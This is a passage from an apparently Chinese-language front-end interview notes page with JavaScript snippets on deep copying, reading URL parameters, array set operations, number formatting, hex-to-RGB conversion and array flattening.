class="line">console.log(a,b);</span><br></pre></td></tr></table></figure><ol start="2"><li>使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象；</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function deepCopy(obj1)&#123;</span><br><span class="line">    let _obj = JSON.stringify(obj1);</span><br><span class="line">    let obj2 = JSON.parse(_obj);</span><br><span class="line">    return obj2;</span><br><span class="line">  &#125;</span><br><span class="line">    var a = [1, [1, 2], 3, 4];</span><br><span class="line">    var b = deepCopy(a);</span><br><span class="line">    b[1][0] = 2;</span><br><span class="line">    alert(a); // 1,1,2,3,4</span><br><span class="line">    alert(b); // 2,2,2,3,4</span><br></pre></td></tr></table></figure><ol start="3"><li>热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝；</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var _ = require(&#x27;lodash&#x27;);</span><br><span class="line">var obj1 = &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    b: &#123; f: &#123; g: 1 &#125; &#125;,</span><br><span class="line">    c: [1, 2, 3]</span><br><span class="line">&#125;;</span><br><span class="line">var obj2 = _.cloneDeep(obj1);</span><br><span class="line">console.log(obj1.b.f === obj2.b.f);</span><br><span class="line">// false</span><br></pre></td></tr></table></figure><h1 id="获取当前页面url"><a href="#获取当前页面url" class="headerlink" title="获取当前页面url"></a>获取当前页面url</h1><h2 id="通过window-location"><a href="#通过window-location" class="headerlink" title="通过window.location"></a>通过window.location</h2><ol><li>window.location.href (设置或获取整个 URL 为字符串)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.href;</span><br></pre></td></tr></table></figure><ol start="2"><li>window.location.protocol (设置或获取 URL 的协议部分)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.protocol;</span><br></pre></td></tr></table></figure><ol start="3"><li>window.location.host (设置或获取 URL 的主机部分)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.host;</span><br></pre></td></tr></table></figure><ol start="4"><li>window.location.port (设置或获取与 URL 关联的端口号码)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.port;</span><br></pre></td></tr></table></figure><ol start="5"><li>window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.pathname;</span><br></pre></td></tr></table></figure><ol start="6"><li>window.location.search (设置或获取 href 属性中跟在问号后面的部分)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.search;</span><br></pre></td></tr></table></figure><ol start="7"><li>window.location.hash (设置或获取 href 属性中在井号“#”后面的分段)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.hash;</span><br></pre></td></tr></table></figure><h2 id="js获取url中参数值"><a href="#js获取url中参数值" class="headerlink" title="js获取url中参数值"></a>js获取url中参数值</h2><ol><li>正则法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> function getQueryString(name) &#123;</span><br><span class="line">          var reg = new RegExp(&#x27;(^|&amp;)&#x27; + name + &#x27;=([^&amp;]*)(&amp;|$)&#x27;, &#x27;i&#x27;);</span><br><span class="line">          var r = window.location.search.substr(1).match(reg);</span><br><span class="line"></span><br><span class="line">          if (r != null) &#123;</span><br><span class="line">             return unescape(r[2]);</span><br><span class="line">          &#125;</span><br><span class="line">          return null;</span><br><span class="line">  &#125;</span><br><span class="line">// 这样调用：</span><br><span class="line">alert(GetQueryString(&quot;参数名1&quot;));</span><br><span class="line">alert(GetQueryString(&quot;参数名2&quot;));</span><br><span class="line">alert(GetQueryString(&quot;参数名3&quot;));</span><br></pre></td></tr></table></figure><ol start="2"><li>split拆分法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function GetRequest() &#123;</span><br><span class="line">         var url = location.search; //获取url中&quot;?&quot;符后的字串</span><br><span class="line">         var theRequest = new Object();</span><br><span class="line"></span><br><span class="line">         if (url.indexOf(&quot;?&quot;) != -1) &#123;</span><br><span class="line">                 var str = url.substr(1);</span><br><span class="line">                 strs = str.split(&quot;&amp;&quot;);</span><br><span class="line">              for(var i = 0; i &lt; strs.length; i ++) &#123;</span><br><span class="line">                      theRequest[strs[i].split(&quot;=&quot;)[0]] = unescape(strs[i].split(&quot;=&quot;)[1]);</span><br><span class="line">               &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     return theRequest;</span><br><span class="line"> &#125;</span><br><span class="line">var Request = new Object();</span><br><span class="line">Request = GetRequest();&lt;br&gt;// var id=Request[&quot;id&quot;]; </span><br><span class="line">// var 参数1,参数2,参数3,参数N;</span><br><span class="line">// 参数1 = Request[&#x27;参数1&#x27;];</span><br><span class="line">// 参数2 = Request[&#x27;参数2&#x27;];</span><br><span class="line">// 参数3 = Request[&#x27;参数3&#x27;];</span><br><span class="line">// 参数N = Request[&#x27;参数N&#x27;];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>指定取某个键对应的值</strong><br>比如说一个url：<a href="http://i.cnblogs.com/?j=js">http://i.cnblogs.com/?j=js</a>, 我们想得到参数j的值，可以通过以下函数调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function GetQueryString(name) &#123; </span><br><span class="line">         var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;, &quot;i&quot;); </span><br><span class="line">         var r = window.location.search.substr(1).match(reg); //获取url中&quot;?&quot;符后的字符串并正则匹配</span><br><span class="line">         var context = &quot;&quot;; </span><br><span class="line"></span><br><span class="line">     if (r != null) </span><br><span class="line">     context = r[2]; </span><br><span class="line">    reg = null; </span><br><span class="line">    r = null; </span><br><span class="line">    return context == null || context == &quot;&quot; || context == &quot;undefined&quot; ? &quot;&quot; : context; </span><br><span class="line"> &#125;</span><br><span class="line">alert(GetQueryString(&quot;j&quot;));</span><br></pre></td></tr></table></figure><p><strong>单个参数的获取方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function GetRequest() &#123;</span><br><span class="line">         var url = location.search; //获取url中&quot;?&quot;符后的字串</span><br><span class="line">         if (url.indexOf(&quot;?&quot;) != -1) &#123;? //判断是否有参数</span><br><span class="line">                  var str = url.substr(1); //从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串</span><br><span class="line">                  strs = str.split(&quot;=&quot;);? //用等号进行分隔 （因为知道只有一个参数 </span><br><span class="line">                                          //所以直接用等号进分隔 如果有多个参数 要用&amp;号分隔 再用等号进行分隔）</span><br><span class="line">                  alert(strs[1]);???? //直接弹出第一个参数 （如果有多个参数 还要进行循环的）</span><br><span class="line">         &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="js中两个数组怎么取交集-差集、并集、补集"><a href="#js中两个数组怎么取交集-差集、并集、补集" class="headerlink" title="js中两个数组怎么取交集+(差集、并集、补集)"></a>js中两个数组怎么取交集+(差集、并集、补集)</h1><ol><li>最普遍的做法<blockquote><p>使用 ES5 语法来实现虽然会麻烦些，但兼容性最好，不用考虑浏览器 JavaScript 版本。也不用引入其他第三方库。</p></blockquote></li></ol><p><strong>直接使用 filter、concat 来计算</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3,4,5]</span><br><span class="line">var b = [2,4,6,8,10]</span><br><span class="line">//交集</span><br><span class="line">var c = a.filter(function(v)&#123; return b.indexOf(v) &gt; -1 &#125;)</span><br><span class="line">//差集</span><br><span class="line">var d = a.filter(function(v)&#123; return b.indexOf(v) == -1 &#125;)</span><br><span class="line">//补集</span><br><span class="line">var e = a.filter(function(v)&#123; return !(b.indexOf(v) &gt; -1) &#125;)</span><br><span class="line">        .concat(b.filter(function(v)&#123; return !(a.indexOf(v) &gt; -1)&#125;))</span><br><span class="line">//并集</span><br><span class="line">var f = a.concat(b.filter(function(v)&#123; return !(a.indexOf(v) &gt; -1)&#125;));</span><br></pre></td></tr></table></figure><p><strong>对 Array 进行扩展</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">//数组功能扩展</span><br><span class="line">//数组迭代函数</span><br><span class="line">Array.prototype.each = function(fn)&#123;</span><br><span class="line">  fn = fn || Function.K;</span><br><span class="line">   var a = [];</span><br><span class="line">   var args = Array.prototype.slice.call(arguments, 1);</span><br><span class="line">   for(var i = 0; i &lt; this.length; i++)&#123;</span><br><span class="line">       var res = fn.apply(this,[this[i],i].concat(args));</span><br><span class="line">       if(res != null) a.push(res);</span><br><span class="line">   &#125;</span><br><span class="line">   return a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//数组是否包含指定元素</span><br><span class="line">Array.prototype.contains = function(suArr)&#123;</span><br><span class="line">  for(var i = 0; i &lt; this.length; i ++)&#123;</span><br><span class="line">      if(this[i] == suArr)&#123;</span><br><span class="line">          return true;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//不重复元素构成的数组</span><br><span class="line">Array.prototype.uniquelize = function()&#123;</span><br><span class="line">   var ra = new Array();</span><br><span class="line">   for(var i = 0; i &lt; this.length; i ++)&#123;</span><br><span class="line">      if(!ra.contains(this[i]))&#123;</span><br><span class="line">          ra.push(this[i]);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   return ra;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//两个数组的交集</span><br><span class="line">Array.intersect = function(a, b)&#123;</span><br><span class="line">   return a.uniquelize().each(function(o)&#123;return b.contains(o) ? o : null&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//两个数组的差集</span><br><span class="line">Array.minus = function(a, b)&#123;</span><br><span class="line">   return a.uniquelize().each(function(o)&#123;return b.contains(o) ? null : o&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//两个数组的补集</span><br><span class="line">Array.complement = function(a, b)&#123;</span><br><span class="line">   return Array.minus(Array.union(a, b),Array.intersect(a, b));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//两个数组并集</span><br><span class="line">Array.union = function(a, b)&#123;</span><br><span class="line">   return a.concat(b).uniquelize();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用 ES6 语法实现</li></ol><p>ES6 中可以借助扩展运算符（…）以及 Set 的特性实现相关计算，代码也会更加简单些。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3,4,5]</span><br><span class="line">var b = [2,4,6,8,10]</span><br><span class="line">console.log(&quot;数组a：&quot;, a);</span><br><span class="line">console.log(&quot;数组b：&quot;, b);</span><br><span class="line"></span><br><span class="line">var sa = new Set(a);</span><br><span class="line">var sb = new Set(b);</span><br><span class="line"></span><br><span class="line">// 交集</span><br><span class="line">let intersect = a.filter(x =&gt; sb.has(x));</span><br><span class="line"></span><br><span class="line">// 差集</span><br><span class="line">let minus = a.filter(x =&gt; !sb.has(x));</span><br><span class="line"></span><br><span class="line">// 补集</span><br><span class="line">let complement  = [...a.filter(x =&gt; !sb.has(x)), ...b.filter(x =&gt; !sa.has(x))];</span><br><span class="line"></span><br><span class="line">// 并集</span><br><span class="line">let unionSet = Array.from(new Set([...a, ...b]));</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>使用 jQuery 实现</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3,4,5]</span><br><span class="line">var b = [2,4,6,8,10]</span><br><span class="line">console.log(&quot;数组a：&quot;, a);</span><br><span class="line">console.log(&quot;数组b：&quot;, b);</span><br><span class="line"></span><br><span class="line">// 交集</span><br><span class="line">let intersect = $(a).filter(b).toArray();</span><br><span class="line">// 差集</span><br><span class="line">let minus = $(a).not(b).toArray();</span><br><span class="line">// 补集</span><br><span class="line">let complement  = $(a).not(b).toArray().concat($(b).not(a).toArray());</span><br><span class="line">// 并集</span><br><span class="line">let unionSet = $.unique(a.concat(b));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="用正则和非正则实现123456789-12-》1，234，567，890-12"><a href="#用正则和非正则实现123456789-12-》1，234，567，890-12" class="headerlink" title="用正则和非正则实现123456789.12=》1，234，567，890.12"></a>用正则和非正则实现123456789.12=》1，234，567，890.12</h1><ul><li>非正则：</li></ul><p>如果数字带有小数点的话，可以使用toLocaleString()方法实现这个需求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b.toLocaleString();</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>正则：<ol><li>带小数点<ul><li>判读是否带有小数点</li><li>没有小数点，就用正则匹配实</li></ul></li></ol></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function numFormat(num) &#123;</span><br><span class="line">    var c = (num.toString().indexOf (&#x27;.&#x27;) !== -1) ? num.toLocaleString() : </span><br><span class="line">             num.toString().replace(/(\d)(?=(?:\d&#123;3&#125;)+$)/g, &#x27;$1,&#x27;);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>2. 带小数点    * 判读是否带有小数点    * 没有小数点，就用正则匹配实</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function numFormat(num) &#123;</span><br><span class="line">    var c = (num.toString().indexOf (&#x27;.&#x27;) !== -1) ? num.toLocaleString() : </span><br><span class="line">             num.toString().replace(/(\d)(?=(?:\d&#123;3&#125;)+$)/g, &#x27;$1,&#x27;);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="写一个判断是否是空对象的函数"><a href="#写一个判断是否是空对象的函数" class="headerlink" title="写一个判断是否是空对象的函数"></a>写一个判断是否是空对象的函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function isEmpty(value) &#123;</span><br><span class="line">    return (</span><br><span class="line">        value === null || value === undefined ||</span><br><span class="line">        (typeof value === &#x27;object&#x27; &amp;&amp; Object.keys(value).length === 0) </span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="代码题：颜色值16进制转10进制rgb"><a href="#代码题：颜色值16进制转10进制rgb" class="headerlink" title="代码题：颜色值16进制转10进制rgb"></a>代码题：颜色值16进制转10进制rgb</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function toRGB(color) &#123;</span><br><span class="line">    var regex = /^#([0-9a-fA-F]&#123;2&#125;)([0-9a-fA-F]&#123;2&#125;)([0-9a-fA-F]&#123;2&#125;)$/ //匹配十六进制的正则</span><br><span class="line">    match = color.match(regex)  // 判断是否是十六进制颜色值</span><br><span class="line">    return match ? &#x27;rgb(&#x27;+parseInt(match[1], 16)+&#x27;,&#x27;+parseInt(match[2], 16)+&#x27;,&#x27;+parseInt(match[3], 16)+&#x27;)&#x27; : color</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="传入-1-2-3-4-5-，返回-1-2-3-4-5"><a href="#传入-1-2-3-4-5-，返回-1-2-3-4-5" class="headerlink" title="传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]"></a>传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]</h1><ol><li>递归</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 方法 1</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line">    var result = [];</span><br><span class="line">    for (var i = 0, len = arr.length; i &lt; len; i++) &#123;</span><br><span class="line">        if (Array.isArray(arr[i])) &#123;</span><br><span class="line">            result = result.concat(flatten(arr[i]))</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            result.push(arr[i])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><ol start="2"><li>toString</li></ol><p>如果<font color="#FF00FF">数组的元素都是数字</font>，那么我们可以考虑使用 toString 方法，因为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, [2, [3, 4]]].toString() // &quot;1,2,3,4&quot;</span><br></pre></td></tr></table></figure><p>调用 toString 方法，返回了一个逗号分隔的扁平的字符串，这时候我们再 split，然后转成数字不就可以实现扁平化了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 方法2</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line">    return arr.toString().split(&#x27;,&#x27;).map(function(item)&#123;</span><br><span class="line">        return +item</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><p>而这种方法使用的场景却非常有限，如果数组是 [1, ‘1’, 2, ‘2’] 的话，<font color="#FF00FF">这种方法就会产生错误的结果。</font><br>3. reduce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 方法3</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line">    return arr.reduce(function(prev, next)&#123;</span><br><span class="line">        return prev.concat(Array.isArray(next) ? flatten(next) : next)</span><br><span class="line">    &#125;, [])</span><br><span class="line">&#125;</span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><p>4.扩展运算符<br>ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line">console.log([].concat(...arr)); // [1, 2, [3, 4]]</span><br></pre></td></tr></table></figure><p>我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 方法4</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line"></span><br><span class="line">    while (arr.some(item =&gt; Array.isArray(item))) &#123;</span><br><span class="line">        arr = [].concat(...arr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><ol start="5"><li>undercore</li></ol><p>那么如何写一个抽象的扁平函数，来方便我们的开发呢，所有又到了我们抄袭 underscore 的时候了~</p><p>在这里直接给出源码和注释，但是要注意，这里的 flatten 函数并不是最终的 _.flatten，为了方便多个 API 进行调用，这里对扁平进行了更多的配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 数组扁平化</span><br><span class="line"> * @param  &#123;Array&#125; input   要处理的数组</span><br><span class="line"> * @param  &#123;boolean&#125; shallow 是否只扁平一层</span><br><span class="line"> * @param  &#123;boolean&#125; strict  是否严格处理元素，下面有解释</span><br><span class="line"> * @param  &#123;Array&#125; output  这是为了方便递归而传递的参数</span><br><span class="line"> * 源码地址：https://github.com/jashkenas/underscore/blob/master/underscore.js#L528</span><br><span class="line"> */</span><br><span class="line">function flatten(input, shallow, strict, output) &#123;</span><br><span class="line"></span><br><span class="line">    // 递归使用的时候会用到output</span><br><span class="line">    output = output || [];</span><br><span class="line">    var idx = output.length;</span><br><span class="line"></span><br><span class="line">    for (var i = 0, len = input.length; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">        var value = input[i];</span><br><span class="line">        // 如果是数组，就进行处理</span><br><span class="line">        if (Array.isArray(value)) &#123;</span><br><span class="line">            // 如果是只扁平一层，遍历该数组，依此填入 output</span><br><span class="line">            if (shallow) &#123;</span><br><span class="line">                var j = 0, length = value.length;</span><br><span class="line">                while (j &lt; length) output[idx++] = value[j++];</span><br><span class="line">            &#125;</span><br><span class="line">            // 如果是全部扁平就递归，传入已经处理的 output，递归中接着处理 output</span><br><span class="line">            else &#123;</span><br><span class="line">                flatten(value, shallow, strict, output);</span><br><span class="line">                idx = output.length;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // 不是数组，根据 strict 的值判断是跳过不处理还是放入 output</span><br><span class="line">        else if (!strict)&#123;</span><br><span class="line">            output[idx++] = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return output;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解释下 strict，</strong> 在代码里我们可以看出，当遍历数组元素时，<font color="#FF00FF">如果元素不是数组，就会对 strict 取反的结果进行判断，如果设置 strict 为 true，就会跳过不进行任何处理，这意味着可以过滤非数组的元素，</font>举个例子：<br>那么设置 strict 到底有什么用呢？不急，我们先看下 shallow 和 strct 各种值对应的结果：</p><ul><li>shallow true + strict false ：正常扁平一层</li><li>shallow false + strict false ：正常扁平所有层</li><li>shallow true + strict true ：去掉非数组元素</li><li>shallow false + strict true ： 返回一个[]</li></ul><h1 id="倒计时，一开始就进行"><a href="#倒计时，一开始就进行" class="headerlink" title="倒计时，一开始就进行"></a>倒计时，一开始就进行</h1><p>一旦进入页面倒计时就开始，因此在window.onload方法中调用倒计时方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      window.onload = function () &#123;</span><br><span class="line">          countDown();</span><br><span class="line">        